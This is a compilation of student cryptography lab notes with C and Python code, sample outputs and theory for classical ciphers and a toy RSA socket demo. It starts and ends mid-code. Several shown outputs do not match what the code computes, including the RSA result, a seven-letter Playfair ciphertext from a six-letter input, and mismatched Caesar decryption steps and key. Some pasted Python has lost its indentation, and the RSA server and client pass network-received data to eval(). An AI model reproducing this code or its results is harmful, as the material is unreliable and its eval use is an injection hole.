    printf("\n");  
}  
  
void decrypt() {  
    char ciphertext[128];  
    char key[16];  
    printf("\nEnter the ciphertext: ");  
    scanf(" %[^\n]", ciphertext);  
    printf("Enter the key: ");  
    scanf(" %[^\n]", key);  
  
    printf("Deciphered Text: ");  
    for (int i = 0, j = 0; i < strlen(ciphertext); i++, j++) {  
        if (j >= strlen(key)) {  
            j = 0;  
        }  
        int shift = toupper(key[j]) - 'A';  
        char decryptedChar = ((toupper(ciphertext[i]) - 'A' - shift + 26) % 26) + 'A';  
        printf("%c", decryptedChar);  
    }  
    printf("\n");  
}  
  
int main() {  
    int option;  
    while (1) {  
        printf("\n1. Encrypt");  
        printf("\n2. Decrypt");  
        printf("\n3. Exit\n");  
        printf("\nEnter your option: ");  
        scanf("%d", &option);  
  
        switch (option) {  
            case 1:  
                encrypt();  
                break;  
            case 2:  
                decrypt();  
                break;  
            case 3:  
                exit(0);  
            default:  
                printf("\nInvalid selection! Try again.\n");  
                break;  
        }  
    }  
    return 0;  
}  

OUTPUT:
1. Encrypt
2. Decrypt
3. Exit

Enter your option: 1

Enter the plaintext (up to 128 characters): Hello World
Enter the key (up to 16 characters): key
Cipher Text: RIJVS UYVJN

1. Encrypt
2. Decrypt
3. Exit

Enter your option: 2

Enter the ciphertext: RIJVS UYVJN
Enter the key: key
Deciphered Text: HELLO WORLD

1. Encrypt
2. Decrypt
3. Exit

Enter your option: 3










TRANPOSITION
def encrypt_transposition(plain_text):
    text_length = len(plain_text)
    num_columns = 3
    num_rows = -(-text_length // num_columns)
    transposition_grid = [[' ' for _ in range(num_columns)] for _ in range(num_rows)]
    index = 0
    for col in range(num_columns):
        for row in range(num_rows):
            if index < text_length:
                transposition_grid[row][col] = plain_text[index]
                index += 1
    encrypted_text = ''.join(''.join(row) for row in transposition_grid)
    return encrypted_text

def decrypt_transposition(encrypted_text):
    text_length = len(encrypted_text)
    num_columns = 3
    num_rows = -(-text_length // num_columns)
    transposition_grid = [[' ' for _ in range(num_columns)] for _ in range(num_rows)]
    index = 0
    for row in range(num_rows):
        for col in range(num_columns):
            if index < text_length:
                transposition_grid[row][col] = encrypted_text[index]
                index += 1
    decrypted_text = ''.join(''.join(row) for row in zip(*transposition_grid))
    return decrypted_text

plain_text = input("Enter the value: ")
encrypted_text = encrypt_transposition(plain_text)
print("Encrypted:", encrypted_text)
decrypted_text = decrypt_transposition(encrypted_text)
print("Decrypted:", decrypted_text)

OUTPUT
Enter the value: Hello World
Encrypted: HlWleoodl r
Decrypted: Hello World


A transposition cipher is a cryptographic technique that involves rearranging the characters in a message to conceal its meaning. Unlike substitution ciphers, which replace each letter with another according to a fixed system, transposition ciphers manipulate the order of the characters while keeping the characters themselves unchanged.

One of the simplest transposition ciphers is the columnar transposition cipher. In this method, the plaintext is written out in rows of a fixed length, and then the columns are rearranged according to a certain permutation. The resulting ciphertext consists of the characters read out column by column.

For example, consider the plaintext "HELLO WORLD" and a permutation of 2-1-3 for a three-column arrangement:

```
H E L
L O  
W O R
L D
```

After rearranging the columns according to the permutation, the ciphertext would be "ELOLWOHLRO D".

Transposition ciphers offer a different level of security compared to substitution ciphers. While they do not alter the characters themselves, they obscure the original message by rearranging them. Breaking transposition ciphers typically involves finding the correct permutation used to rearrange the columns or rows.

One approach to breaking transposition ciphers is through brute force, where all possible permutations are tested until the correct one is found. However, this method becomes computationally impractical for longer messages or larger key spaces.

Another method for breaking transposition ciphers is through frequency analysis or other statistical techniques applied to the ciphertext. While transposition ciphers do not directly alter the frequency distribution of characters like substitution ciphers do, certain patterns may still emerge depending on the specific transposition method used.

Despite their vulnerabilities, transposition ciphers have been used historically and continue to be studied in cryptography. They serve as an important concept in understanding cryptographic principles and are often combined with other techniques to create more secure encryption methods. Additionally, transposition ciphers are valuable for educational purposes, helping individuals learn about encryption and decryption techniques and the importance of key management in cryptography.











SUBSTITUTION
def encrypt(plain_text, key):
    encrypted_text = ""
    for char in plain_text:
        if char != '#':
            encrypted_char = chr(ord(char) + key)
            encrypted_text += encrypted_char
    return encrypted_text

def decrypt(encrypted_text, key):
    decrypted_text = ""
    for char in encrypted_text:
        if char != '#':
            decrypted_char = chr(ord(char) - key)
            decrypted_text += decrypted_char
    return decrypted_text

plain_text = input("Enter the value: ")
key = 3
encrypted_text = encrypt(plain_text, key)
print("Encrypted:", encrypted_text)
decrypted_text = decrypt(encrypted_text, key)
print("Decrypted:", decrypted_text)


OUTPUT
Enter the value: Hello World
Encrypted: Khoor#Zruog
Decrypted: Hello World



SUBSTITUTION TRANSPOSITION AND RAIL FENSE THEORY
A substitution cipher is a classic method of encryption used to conceal the meaning of a message by replacing each letter in the plaintext with another letter according to a predetermined system or key. This method operates on the principle of substituting one symbol for another. In its simplest form, substitution ciphers involve replacing each letter of the alphabet with another letter, number, or symbol.

One of the most well-known substitution ciphers is the Caesar cipher, named after Julius Caesar, who is believed to have used it to encrypt his private correspondence. In the Caesar cipher, each letter in the plaintext is shifted a certain number of places down or up the alphabet. For example, with a shift of 3, the letter A would be replaced by D, B by E, and so on.

Another example of a substitution cipher is the Atbash cipher, which involves replacing each letter with its counterpart in the reverse alphabet. For instance, A becomes Z, B becomes Y, and so forth. The Atbash cipher is one of the earliest known substitution ciphers and was used by ancient Hebrew scribes.

While substitution ciphers are relatively easy to understand and implement, they are also susceptible to cryptanalysis. One common method of breaking substitution ciphers is frequency analysis, where the frequency of letters or symbols in the ciphertext is analyzed to deduce the original plaintext. For example, in English text, the letter E is the most commonly used letter, so the most frequent letter in the ciphertext is likely to correspond to E in the plaintext.

Despite their vulnerabilities, substitution ciphers have been employed throughout history and continue to serve as the basis for more complex encryption methods. They provide a foundation for understanding cryptographic principles and are often used as educational tools in learning about encryption and decryption techniques.

Experiment no.1: Design and implement of a product cipher using Substitution and 
Transposition Cipher 
Learning Objective: Student should be able to design and implementation of a product 
cipher using Substitution and Transposition Cipher. 
Tools: C/C++/Java/Python or any computational software 
Theory: 
A substitution cipher is a method of encoding by which units of plaintext are replaced 
with ciphertext, according to a fixed system; the "units" may be single letters (the most 
common), pairs of letters, triplets of letters, mixtures of the above, and so forth. The 
receiver deciphers the text by performing the inverse substitution. 
There are a number of different types of substitution cipher. If the cipher operates on 
single letters, it is termed a simple substitution cipher; a cipher that operates on 
larger groups of letters is termed polyalphabetic. A monoalphabetic cipher uses fixed 
substitution over the entire message, whereas a polyalphabetic cipher uses a number of 
substitutions at different positions in the message, where a unit from the plaintext is 
mapped to one of several possibilities in the ciphertext and vice versa. 
The function for Additive/Shift/Generalized Caesar Cipher is given as follows: 
◻ It can use any shift from 1 to 25, i.e., replace each letter by a letter a fixed distance 
away. 
◻ Ci=E(Pi)=(Pi+k) mod 26 and Pi=D(Ci)=(Ci-k) mod 26. 
In Cryptography, a Caesar Cipher, also known as Caesar's Cipher, the Shift Cipher, 
Caesar's Code or Caesar Shift, is one of the simplest and most widely known encryption 
techniques. It is a type of substitution cipher in which each letter in the plaintext is 
replaced by a letter some fixed number of positions down the alphabet. For example, 
with a left shift of 3, A would be replaced by D, E would become H, and so on. The 
method is named after Julius Caesar, who used it in his private correspondence. 
The function for Caesar Cipher is defined as follows: 
● Ci= E(Pi)=(Pi+3) mod 26. 
● Pi=D(Ci)=(Ci-3) mod 26. 
● Example: 
● Plain Text: ABCDEFGHIJKLMNOPQRSTUVWXYZ 
● Cipher Text: DEFGHIJKLMNOPQRSTUVWXYZABC 
Substitution ciphers can be compared with transposition ciphers. In a transposition 
cipher, the units of the plaintext are rearranged in a different and usually quite complex 
order, but the units themselves are left unchanged. By contrast, in a substitution cipher, 
the units of the plaintext are retained in the same sequence in the ciphertext, but the units 
themselves are altered. 
A transposition cipher is a method of encryption by which the positions held 
by units of plaintext (which are commonly characters or groups of characters) are 
shifted according to a regular system, so that the ciphertext constitutes a permutation of 
the plaintext. That is, the order of the units is changed (the plaintext is reordered). 
Mathematically a bijective function is used on the characters' positions to encrypt and an 
inverse function to decrypt. 
Transposition Ciphers does not substitute one symbol for another, instead it changes the 
location of the symbols. 
A symbol in the first position of the plaintext may appear in the tenth position of the 
ciphertext. A symbol in the eight position in the plaintext may appear in the first position 
of the ciphertext. A transposition cipher reorders (transposes) the symbols. Simple 
transposition ciphers, which were used in the past, are keyless. 
There are two methods for permutation of characters. In the first method, the text is 
written into a table column by column and then transmitted row by row. In the second 
method, the text is written into a table row by row and then transmitted column by 
column. 
Caesar Cipher : 
Programimport random 
def caesar_cipher(text, key, 
mode='encrypt'): 
 result = "" 
 process_steps = [] 
 for char in text: 
 if char.isalpha(): 
 is_upper = char.isupper() 
 
 # Convert the character to a number 
where A=0, B=1, ..., Z=25 
 char_index = ord(char) - ord('A') if 
is_upper else ord(char) - ord('a') 
 # Shift the number by the specified 
key 
 shifted_index = (char_index + key) 
% 26 if mode == 'encrypt' else (char_index 
- key) % 26 
 # Convert the shifted number back 
to a character 
 shifted_char = chr(shifted_index + 
ord('A')) if is_upper else chr(shifted_index 
+ ord('a')) 
 result += shifted_char 
 process_steps.append((char, 
char_index, shifted_char)) 
 else: 
 result += char 
 return result, process_steps 
# Get user input 
plaintext = input("Enter the text to process: 
") 
# Generate a random key within the range 
of 0 to 25 
key = random.randint(0, 25) 
# Encrypt the user input and show the 
encryption process 
encrypted_text, encryption_steps = 
caesar_cipher(plaintext, key, 
mode='encrypt') 
print(f"Original Text: {plaintext}") 
print(f"Generated Shift (Key) for 
Encryption: {key}") 
print(f"Encryption Process:") 
for step in encryption_steps: 
 print(f"{step[0]} ({step[1]}) -> 
{step[2]}") 
print(f"Encrypted Text: {encrypted_text}") 
# Decrypt the encrypted text and show the 
decryption process 
decrypted_text, decryption_steps = 
caesar_cipher(encrypted_text, key, 
mode='decrypt') 
print("\nDecryption Process:") 
for step in decryption_steps: 
 print(f"{step[2]} ({step[1]}) -> 
{step[0]}") 
print(f"Shift (Key) for Decryption: {key}") 
print(f"Decrypted Text: {decrypted_text}") 
Output: 
Enter the text to process: pratham 
Original Text: pratham 
Generated Shift (Key) for Encryption: 19 
Encryption Process: 
p (15) -> i 
r (17) -> k 
a (0) -> t 
t (19) -> m 
h (7) -> a 
a (0) -> t 
m (12) -> f 
Encrypted Text: iktmatf 
Decryption Process: 
p (8) -> i 
r (10) -> k 
a (19) -> t 
t (12) -> m 
h (0) -> a 
a (19) -> t 
m (5) -> f 
Shift (Key) for Decryption: 1 
Decrypted Text: pratham
 
Rail Fence Cipher : 
Programimport random 
def transpose_cipher(text, num_rows): 
 clean_text = ''.join(text.split()).upper() 
 length = len(clean_text) 
 num_columns = (length + num_rows - 
1) // num_rows 
 padded_text = 
clean_text.ljust(num_rows * 
num_columns) 
 matrix = 
[list(padded_text[i:i+num_columns]) for i 
in range(0, len(padded_text), 
num_columns)] 
 # Rearrange letters randomly in each 
column 
 for col_index in range(num_columns): 
 col = [row[col_index] for row in 
matrix] 
 random.shuffle(col) 
 for row_index in range(num_rows): 
 matrix[row_index][col_index] = 
col[row_index] 
 # Display the matrix 
 print("\nMatrix:") 
 for row in matrix: 
 print(' '.join(row)) 
 encrypted_text = ''.join([''.join(row) for 
row in matrix]) 
 return encrypted_text 
# Get user input 
plaintext = input("Enter the text to encrypt: 
") 
num_rows = int(input("Enter the number 
of rows: ")) 
# Encrypt the user input 
encrypted_text = 
transpose_cipher(plaintext, num_rows) 
# Display the result 
print(f"\nEncrypted Text: 
{encrypted_text}") 
Output: 
Enter the text to encrypt: pratham 
Enter the number of rows: 4 
Matrix: 
M 
H A 
A R 
P T 
Encrypted Text: M HAARPT 
Applications: 
1. Ciphers are most commonly used in secure online communications to prevent 
unauthorized access. They’re also incorporated into many different network protocols 
such as ‘Secure Sockets Layer’, ‘TLS’, HTTPS, etc. 
2. In daily life we see applications of cryptography in ATM services, emails, etc 
Result and Discussion: 
In vignered substitution cipher it’s possible to encrypt more than one characters to a 
common character and is dependent on the keystream used. The keystream is used 
repeatedly until all the plaintext characters are encrypted. The same keystream is 
necessary in order to decrypt the ciphertext back to original plain text. In keyed 
transposition cipher the keys used are actually mappers used to map each character in 
the plaintext to a specific index less than the length of plaintext. Original plaintext is 
divided in chunks of length equal to the number of keys which are then encrypted using 
the keys. If the last chunk doesn’t have length equal to the number of keys then we add 
some bogus characters to the last chunk until desired length is obtained and encrypt the 
message. 
Learning Outcomes: The student should have the ability to design & implement product 
cipher using Substitution and Transposition Cipher 
LO1: To describe & understand about Substitution and Transposition cipher techniques 
LO2: To implement Substitution and Transposition cipher techniques 
Course Outcomes: Upon completion of the course students will be able to understand & 
implement Substitution and Transposition Cipher. 
Conclusion: 
In this experiment, we implemented a substitution cipher called ‘Caesar Cipher’ and a 
transposition cipher called ‘Keyed Transposition cipher’ both of which included the use of 
anumber of keys for encryption instead of standard one key which enhances the security and 
makes it extremely difficult to decrypt the ciphertext without the knowledge of keys. The 
complexity of blind decryption increases with the increase in number of keys used










RSA
# Python for RSA asymmetric cryptographic algorithm.
# For demonstration, values are
# relatively small compared to practical application
import math

def gcd(a, h):
    temp = 0
    while(1):
        temp = a % h
        if (temp == 0):
            return h
        a = h
        h = temp

p = 3
q = 7
n = p * q
e = 2
phi = (p - 1) * (q - 1)

while (e < phi):
    # e must be co-prime to phi and
    # smaller than phi.
    if(gcd(e, phi) == 1):
        break
    else:
        e = e + 1

# Private key (d stands for decrypt)
# choosing d such that it satisfies
# d*e = 1 + k * totient

k = 2
d = (1 + (k * phi)) / e

# Taking input from the user
msg = float(input("Enter a message to encrypt: "))
print("Message data = ", msg)

# Encryption c = (msg ^ e) % n
c = pow(msg, e)
c = math.fmod(c, n)
print("Encrypted data = ", c)

# Decryption m = (c ^ d) % n
m = pow(c, d)
m = math.fmod(m, n)
print("Original Message Sent = ", m)


-----------------------------------------
input give either 12 or 11 or 2 digit number
OUTPUT
Enter a message to encrypt: 5
Message data =  5.0
Encrypted data =  62.0
Original Message Sent =  5.0

Experiment 04
Aim: Analyze and implement RSA Algorithm
Tools: C/C++/Java/Python
Theory: RSA Algorithm
RSA (Rivest-Shamir-Adleman) is a widely used public key cryptosystem that enables secure communication 
and digital signatures. It was introduced in 1977 by Ron Rivest, Adi Shamir, and Leonard Adleman, and 
remains one of the most widely used asymmetric encryption algorithms.
Key Generation:
• Choose two large prime numbers, p and q.
• Compute their product, n = p * q. The security of RSA relies on the difficulty of factoring the product of 
two large prime numbers.
• Calculate Euler's totient function, φ(n) = (p-1)(q-1).
• Select an integer e, known as the public exponent, such that 1 < e < φ(n), and e is coprime with φ(n). 
Common choices for e are 3 or 65537 due to their efficiency.
• Compute the private exponent d, which is the modular multiplicative inverse of e modulo φ(n). In other 
words, d * e ≡ 1 (mod φ(n)).
• The public key is (n, e), and the private key is (n, d).
Encryption:
• Represent the plaintext message as an integer m, where 0 < m < n.
• Compute the ciphertext c ≡ m^e (mod n).
Decryption:
• Receive the ciphertext c.
• Compute the plaintext message m ≡ c^d (mod n).
Application of RSA:
• Secure Communication: RSA is used in SSL/TLS for key exchange and digital signatures, ensuring secure 
Internet communication.
• Digital Signatures: RSA creates digital signatures, verifying message authenticity and integrity, crucial for 
secure transactions and document validation.
• Secure Email: RSA encrypts and signs emails in PGP and S/MIME, enhancing confidentiality and
confirming sender legitimacy.
• File Transfer: RSA secures file transfers by encrypting data, safeguarding sensitive information during 
transmission.
• Online Transactions: RSA protects online transactions, encrypting details like credit cards, fostering 
secure e-commerce and banking.
• VPN Security: RSA is employed in VPNs for key exchange and authentication, establishing secure 
connections over the Internet.
Implementation:Code
-
Server side 
import socket 
import random
def is_prime(num): 
if num < 2:
return False
for
i in range(2, int(num**0.5)
+ 1): 
if num % i == 0:
return False 
return True
def gcd(a, b): 
while
b != 0:
a,
b
= b,
a
% b 
return a
def mod_inverse(a, m): 
m0, x0, x1 = m, 0, 1
while
a
> 1: 
q
= a //
m
m,
a
=
a
% m,
m
x0, x1 = x1 
- q * x0, x0 
return x1
+ m0 if x1
<
0 else x1
def generate_keypair(): 
p, q = 0, 0
while not is_prime(p): p = random.randint(100, 1000) 
while not is_prime(q) or p == q: q = random.randint(100, 1000) 
n = p * q
phi
= (p
- 1)
* (q
- 1)
e
= 65537
# Commonly used value for e 
d = mod_inverse(e, phi)
return (n, e), (n, d)
def mod_pow(base, exponent, modulus): 
result = 1
while exponent
> 0:
if exponent
%
2 == 1:
result
= (result
* base)
% modulus 
base = (base * base) % modulus 
exponent //= 2
return result
def decrypt(encrypted, private_key): 
n, d = private_key
decrypted
= [chr(mod_pow(char, d, n)) for 
char in encrypted]
return ''.join(decrypted)
def main():
host = '127.0.0.1'
port = 12345
server_socket = 
socket.socket(socket.AF_INET, 
socket.SOCK_STREAM)
server_socket.bind((host, port)) 
server_socket.listen()
print("Waiting for client to connect...") 
client_socket, addr =
server_socket.accept() 
print("Client connected!")
public_key, private_key = 
generate_keypair()
print("Public key generated:", public_key) 
print("Private key generated:",
private_key) # Send public key to the client
client_socket.sendall(str(public_key).encode 
())
# Receive public key from client 
public_key_str =
client_socket.recv(1024).decode() 
public_key = eval(public_key_str) 
print("Received public key from client:",
public_key)
encrypted_message = 
client_socket.recv(1024).decode()
print("Received encrypted message from 
client:", encrypted_message)
decrypted_message = 
decrypt(eval(encrypted_message), 
private_key)
print("Decrypted message:", 
decrypted_message)
server_socket.close()
if _name_ == "_main_": 
main()
Client Side:
import socket 
import random
def is_prime(num): 
if num < 2:
return False
for i in range(2, int(num**0.5) + 1): 
if num % i == 0:
return False 
return True
def gcd(a, b): 
while b != 0:
a, b = b, a % b 
return a
def mod_inverse(a, m): 
m0, x0, x1 = m, 0, 1
while a > 1: 
q = a // m
m, a = a % m, m
x0, x1 = x1 - q * x0, x0 
return x1 + m0 if x1 < 0 else x1
def generate_keypair(): 
p, q = 0, 0
while not is_prime(p):
p = random.randint(100, 1000) 
while not is_prime(q) or p == q:
q = random.randint(100, 1000) 
n = p * q
phi = (p - 1) * (q - 1)
e = 65537 # Commonly used value for e 
d = mod_inverse(e, phi)
return (n, e), (n, d)
def mod_pow(base, exponent, modulus): 
result = 1
while exponent > 0:
if exponent % 2 == 1:
result = (result * base) % modulus 
base = (base * base) % modulus 
exponent //= 2
return result
def encrypt(message, public_key): 
n, e = public_key
encrypted = [mod_pow(ord(char), e, n)
for char in message] 
return encrypted
def main():
host = '127.0.0.1'
port = 12345
public_key, private_key = 
generate_keypair()
print("Public key generated:", 
public_key)
print("Private key generated:", 
private_key)
client_socket = 
socket.socket(socket.AF_INET, 
socket.SOCK_STREAM)
client_socket.connect((host, port))
# Receive public key from server 
public_key_str =
client_socket.recv(1024).decode() 
public_key = eval(public_key_str) 
print("Received public key from server:",
public_key)
client_socket.sendall(str(public_key).encod 
e())
# Get the message to send 
message_to_send = input("Enter the
message to send: ")
# Encrypt the message 
encrypted_message =
encrypt(message_to_send, public_key) 
print("Encrypted message:",
encrypted_message)
# Send the encrypted message to the 
server
client_socket.sendall(str(encrypted_messag 
e).encode())
client_socket.close() 
if _name_ == "_main_":
main()
Output:
Server SidePS C:\Users\Anshul\downloads> python server.py
>>
Waiting for client to connect...
Client connected!
Public key generated: (274793, 65537)
Private key generated: (274793, 184433)
Received public key from client: (274793, 65537)
Received encrypted message from client: [165046, 138111, 53912, 153432, 199435, 19523, 18397, 58062, 145712, 241304, 129907, 18397, 
165046, 138111, 198025, 18397, 204485, 241304, 165046, 85413, 153432, 165046, 58062, 18397, 58062, 145712, 198025, 51611]
Decrypted message: anshul more and pratham mody
Client SidePS C:\Users\Anshul\downloads> python client.py
Public key generated: (121903, 65537)
Private key generated: (121903, 62153)
Received public key from server: (274793, 65537)
Enter the message to send: anshul more and pratham mody
Encrypted message: [165046, 138111, 53912, 153432, 199435, 19523, 18397, 58062, 145712, 241304, 129907, 18397, 165046, 138111, 
198025, 18397, 204485, 241304, 165046, 85413, 153432, 165046, 58062, 18397, 58062, 145712, 198025, 51611]
Result and Discussion:
In this experiment, we implemented the RSA Algorithm for key generation, encryption, and 
decryption. The decrypted message matched the original message, indicating a successful 
implementation.
Learning Outcomes:
1. Understand the RSA Algorithm.
2. Analyze and implement the RSA Algorithm for secure data transmission.
Conclusion: After performing this experiment, we gained insights into the RSA Algorithm and 
its application in secure communication













RAIL FENSE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define VAL(PTR) (*PTR)

typedef char* STRING;
typedef char** STRING_REF;

void flush_stdin()
{
	while(fgetc(stdin) != '\n');
}

void rail_fence_encrypt(STRING_REF str, int depth)
{
	STRING old_str = VAL(str);
	int len_str = strlen(old_str), itr_str, rows, cols;
	STRING res_str = (STRING)malloc(sizeof(char)*len_str);
	for(rows = 0, itr_str = 0 ; rows < depth ; ++rows)
	{
		for(cols = rows ; cols < len_str ; cols += depth)
		{
			res_str[itr_str] = old_str[cols];
			++itr_str;
		}
	}
	res_str[itr_str] = '\0';
	free(VAL(str));
	VAL(str) = res_str;
}

void rail_fence_decrypt(STRING_REF str, int depth)
{
	STRING old_str = VAL(str);
	int len_str = strlen(old_str), itr_str, rows, counter;
	STRING res_str = (STRING)malloc(sizeof(char)*len_str);
	for(counter = 0, itr_str = 0 ; counter < len_str/depth ; ++counter)
	{
		for(rows = counter ; rows < len_str ; rows+=(len_str/depth))
		{
			res_str[itr_str] = old_str[rows];
			++itr_str;
		}
	}
	free(VAL(str));
	VAL(str) = res_str;
}

int main(void)
{
	STRING str;
	int txt_length, key;

	printf("Enter the depth: ");
	scanf("%d",&key);

	printf("Enter the length of the text: ");
	scanf("%d",&txt_length);

	printf("Input the string you want to encrypt: ");
	flush_stdin();
	str = (char*)malloc((txt_length+1)*sizeof(char));
	fgets(str,txt_length+1,stdin);

	rail_fence_encrypt(&str,key);
	printf("\nThe encrypted text is: %s",str);

	rail_fence_decrypt(&str,key);
	printf("\nThe decrypted text is: %s",str);

	return 0;
}

-----------------------------
Enter the depth: 3
Enter the length of the text: 15
Input the string you want to encrypt: attack is today

The encrypted text is: aa  dtcitatksoy
The decrypted text is: attack is today
















PLAYFAIR:
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define SIZE 30

void change_to_lowercase(char plain[], int ps) {
    int i;
    for (i = 0; i < ps; i++) {
        if (plain[i] > 64 && plain[i] < 91)
            plain[i] += 32;
    }
}

int remove_all_spaces(char* plain, int ps) {
    int i, count = 0;
    for (i = 0; i < ps; i++)
        if (plain[i] != ' ')
            plain[count++] = plain[i];
    plain[count] = '\0';
    return count;
}

void generate_key(char key[], int ks, char keyT[5][5]) {
    int i, j, k, flag = 0, *dicty;

    dicty = (int*)calloc(26, sizeof(int));

    for (i = 0; i < ks; i++) {
        if (key[i] != 'j')
            dicty[key[i] - 97] = 2;
    }
    dicty['j' - 97] = 1;

    i = 0;
    j = 0;
    for (k = 0; k < ks; k++) {
        if (dicty[key[k] - 97] == 2) {
            dicty[key[k] - 97] -= 1;
            keyT[i][j] = key[k];
            j++;
            if (j == 5) {
                i++;
                j = 0;
            }
        }
    }
    for (k = 0; k < 26; k++) {
        if (dicty[k] == 0) {
            keyT[i][j] = (char)(k + 97);
            j++;
            if (j == 5) {
                i++;
                j = 0;
            }
        }
    }
}

void searching(char keyT[5][5], char a, char b, int arr[]) {
    int i, j;

    if (a == 'j')
        a = 'i';
    else if (b == 'j')
        b = 'i';

    for (i = 0; i < 5; i++) {
        for (j = 0; j < 5; j++) {
            if (keyT[i][j] == a) {
                arr[0] = i;
                arr[1] = j;
            }
            else if (keyT[i][j] == b) {
                arr[2] = i;
                arr[3] = j;
            }
        }
    }
}

int mod5(int a) {
    if (a < 0)
        a += 5;
    return (a % 5);
}

void encrypt(char str[], char keyT[5][5], int ps) {
    int i, a[4];
    for (i = 0; i < ps; i += 2) {
        searching(keyT, str[i], str[i + 1], a);
        if (a[0] == a[2]) {
            str[i] = keyT[a[0]][(a[1] + 1) % 5];
            str[i + 1] = keyT[a[0]][(a[3] + 1) % 5];
        }
        else if (a[1] == a[3]) {
            str[i] = keyT[(a[0] + 1) % 5][a[1]];
            str[i + 1] = keyT[(a[2] + 1) % 5][a[1]];
        }
        else {
            str[i] = keyT[a[0]][a[3]];
            str[i + 1] = keyT[a[2]][a[1]];
        }
    }
}

void decrypt(char str[], char keyT[5][5], int ps) {
    int i, a[4];
    for (i = 0; i < ps; i += 2) {
        searching(keyT, str[i], str[i + 1], a);
        if (a[0] == a[2]) {
            str[i] = keyT[a[0]][mod5(a[1] - 1)];
            str[i + 1] = keyT[a[0]][mod5(a[3] - 1)];
        }
        else if (a[1] == a[3]) {
            str[i] = keyT[mod5(a[0] - 1)][a[1]];
            str[i + 1] = keyT[mod5(a[2] - 1)][a[1]];
        }
        else {
            str[i] = keyT[a[0]][a[3]];
            str[i + 1] = keyT[a[2]][a[1]];
        }
    }
}

void playfair_cipher(char str[], char key[], int mode) {
    char ps, ks, keyT[5][5];

    // Key text
    ks = strlen(key);
    ks = remove_all_spaces(key, ks);
    change_to_lowercase(key, ks);

    // Ciphertext or plaintext 
    ps = strlen(str);
    change_to_lowercase(str, ps);
    ps = remove_all_spaces(str, ps);

    generate_key(key, ks, keyT);

    if (mode == 1) { // Encryption
        encrypt(str, keyT, ps);
    }
    else if (mode == 0) { // Decryption
        decrypt(str, keyT, ps);
    }
}

int main() {
    char str[SIZE], key[SIZE];
    int choice;

    printf("Enter key: ");
    scanf("%[^\n]s", key);
    printf("Enter plaintext/ciphertext: ");
    scanf("\n");
    scanf("%[^\n]s", str);

    printf("Choose operation:\n");
    printf("1. Encryption\n");
    printf("2. Decryption\n");
    scanf("%d", &choice);

    switch (choice) {
        case 1:
            playfair_cipher(str, key, 1);
            printf("Encrypted text: %s\n", str);
            break;
        case 2:
            playfair_cipher(str, key, 0);
            printf("Decrypted text: %s\n", str);
            break;
        default:
            printf("Invalid choice.\n");
    }

    return 0;
}


OUTPUT
Enter key: Hello
Enter plaintext/ciphertext: OpenAI
Choose operation:
1. Encryption
2. Decryption
1
Encrypted text: aiosxzo
















MULTIPLICATIVE:
#include<stdio.h>

void encrypt(char message[], int key) {
    int i;
    char ch;
    for(i = 0; message[i] != '\0'; ++i){
        ch = message[i];
        if(ch >= 'a' && ch <= 'z'){
            ch = ((ch - 'a') * key) % 26 + 'a';
            message[i] = ch;
        }
        else if(ch >= 'A' && ch <= 'Z'){
            ch = ((ch - 'A') * key) % 26 + 'A';
            message[i] = ch;
        }
    }
    printf("Encrypted message: %s\n", message);
}

void decrypt(char message[], int key) {
    int i, inverse;
    char ch;
    // Calculate the multiplicative inverse of the key
    for (inverse = 1; inverse < 26; ++inverse) {
        if ((key * inverse) % 26 == 1) {
            break;
        }
    }
    for(i = 0; message[i] != '\0'; ++i){
        ch = message[i];
        if(ch >= 'a' && ch <= 'z'){
            ch = ((ch - 'a') * inverse) % 26 + 'a';
            message[i] = ch;
        }
        else if(ch >= 'A' && ch <= 'Z'){
            ch = ((ch - 'A') * inverse) % 26 + 'A';
            message[i] = ch;
        }
    }
    printf("Decrypted message: %s\n", message);
}

int main() {
    char message[100];
    int key;
    
    printf("Enter a message: ");
    fgets(message, sizeof(message), stdin);
    printf("Enter key (must be co-prime with 26): ");
    scanf("%d", &key);
    
    encrypt(message, key);
    decrypt(message, key);

    return 0;
}

---------------------
/tmp/wUC3yNacHQ.o
Enter a message: Hello
Enter key (must be co-prime with 26): 9
Encrypted message: Lkvvw

Decrypted message: Hello




















KEYED TRANSPOSITION
import math

key = "HACK"

# Encryption
def encryptMessage(msg):
    cipher = ""

    # track key indices
    k_indx = 0

    msg_len = float(len(msg))
    msg_lst = list(msg)
    key_lst = sorted(list(key))

    # calculate column of the matrix
    col = len(key)
    
    # calculate maximum row of the matrix
    row = int(math.ceil(msg_len / col))

    # add the padding character '_' in empty
    # the empty cell of the matix 
    fill_null = int((row * col) - msg_len)
    msg_lst.extend('_' * fill_null)

    # create Matrix and insert message and 
    # padding characters row-wise 
    matrix = [msg_lst[i: i + col] 
              for i in range(0, len(msg_lst), col)]

    # read matrix column-wise using key
    for _ in range(col):
        curr_idx = key.index(key_lst[k_indx])
        cipher += ''.join([row[curr_idx] 
                          for row in matrix])
        k_indx += 1

    return cipher

# Decryption
def decryptMessage(cipher):
    msg = ""

    # track key indices
    k_indx = 0

    # track msg indices
    msg_indx = 0
    msg_len = float(len(cipher))
    msg_lst = list(cipher)

    # calculate column of the matrix
    col = len(key)
    
    # calculate maximum row of the matrix
    row = int(math.ceil(msg_len / col))

    # convert key into list and sort 
    # alphabetically so we can access 
    # each character by its alphabetical position.
    key_lst = sorted(list(key))

    # create an empty matrix to 
    # store deciphered message
    dec_cipher = []
    for _ in range(row):
        dec_cipher += [[None] * col]

    # Arrange the matrix column wise according 
    # to permutation order by adding into new matrix
    for _ in range(col):
        curr_idx = key.index(key_lst[k_indx])

        for j in range(row):
            dec_cipher[j][curr_idx] = msg_lst[msg_indx]
            msg_indx += 1
        k_indx += 1

    # convert decrypted msg matrix into a string
    try:
        msg = ''.join(sum(dec_cipher, []))
    except TypeError:
        raise TypeError("This program cannot",
                        "handle repeating words.")

    null_count = msg.count('_')

    if null_count > 0:
        return msg[: -null_count]

    return msg

# Driver Code
msg = "Geeks for Geeks"

cipher = encryptMessage(msg)
print("Encrypted Message: {}".
               format(cipher))

print("Decryped Message: {}".
       format(decryptMessage(cipher)))

OUTPUT
Encrypted Message: e  kefGsGsrekoe_
Decryped Message: Geeks for Geeks

=== Code Execution Successful ===

USER INPUT CODE

import math

key = input("Enter the key: ")

# Encryption
def encryptMessage(msg):
    cipher = ""

    # track key indices
    k_indx = 0

    msg_len = float(len(msg))
    msg_lst = list(msg)
    key_lst = sorted(list(key))

    # calculate column of the matrix
    col = len(key)
    
    # calculate maximum row of the matrix
    row = int(math.ceil(msg_len / col))

    # add the padding character '_' in empty
    # the empty cell of the matix 
